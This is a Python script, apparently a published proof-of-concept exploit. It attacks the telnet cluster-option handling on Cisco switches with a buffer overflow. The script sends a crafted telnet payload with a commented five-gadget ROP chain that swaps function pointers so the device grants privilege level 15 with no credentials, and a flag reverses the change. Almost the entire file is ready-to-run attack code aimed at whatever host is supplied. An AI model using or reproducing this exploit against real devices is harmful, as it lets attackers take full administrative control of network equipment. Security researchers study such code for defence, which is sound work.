#!/usr/bin/python
# Author:
#  Artem Kondratenko (@artkond)

import socket
import sys
from time import sleep

set_credless = True

if len(sys.argv) < 3:
	print sys.argv[0] + ' [host] --set/--unset'
	sys.exit()
elif sys.argv[2] == '--unset':
	set_credless = False
elif sys.argv[2] == '--set':
	pass
else:
	print sys.argv[0] + ' [host] --set/--unset'
	sys.exit()


s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 23))

print '[+] Connection OK'
print '[+] Recieved bytes from telnet service:', repr(s.recv(1024))
#sleep(0.5)
print '[+] Sending cluster option'

print '[+] Setting credless privilege 15 authentication' if set_credless else '[+] Unsetting credless privilege 15 authentication'



payload = '\xff\xfa\x24\x00'
payload += '\x03CISCO_KITS\x012:'
payload += 'A' * 116
payload += '\x00\x00\x37\xb4'		# first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
#next bytes are shown as offsets from r1
payload += '\x02\x2c\x8b\x74'		# +8  address of pointer to is_cluster_mode function - 0x34
if set_credless is True:
	payload += '\x00\x00\x99\x80'	# +12 set  address of func that rets 1
else:
	payload +=	'\x00\x04\xea\x58'	# unset 
payload += 'BBBB'					# +16(+0) r1 points here at second gadget
payload += '\x00\xdf\xfb\xe8' 		# +4 second gadget address 0x00dffbe8: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
payload += 'CCCC'					# +8 
payload += 'DDDD'					# +12
payload += 'EEEE'					# +16(+0) r1 points here at third gadget
payload += '\x00\x06\x78\x8c'		# +20(+4) third gadget address. 0x0006788c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr; 
payload += '\x02\x2c\x8b\x60'		# +8  r1+8 = 0x022c8b60
payload += 'FFFF'					# +12 
payload += 'GGGG'					# +16(+0) r1 points here at fourth gadget 
payload += '\x00\x6b\xa1\x28' 		# +20(+4) fourth gadget address 0x006ba128: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
if set_credless:
	payload += '\x00\x12\x52\x1c'	# +8 address of the replacing function that returns 15 (our desired privilege level). 0x0012521c: li r3, 0xf; blr; 
else:
	payload += '\x00\x04\xe6\xf0'	# unset
payload += 'HHHH'					# +12
payload += 'IIII'					# +16(+0) r1 points here at fifth gadget
payload += '\x01\x48\xe5\x60'		# +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
payload += 'JJJJ'					# +8 r1 points here at third gadget
payload += 'KKKK'					# +12
payload += 'LLLL'					# +16
payload += '\x01\x13\x31\xa8'		# +20 original execution flow return addr
payload += ':15:' +  '\xff\xf0'

s.send(payload)

print '[+] All done'

s.close()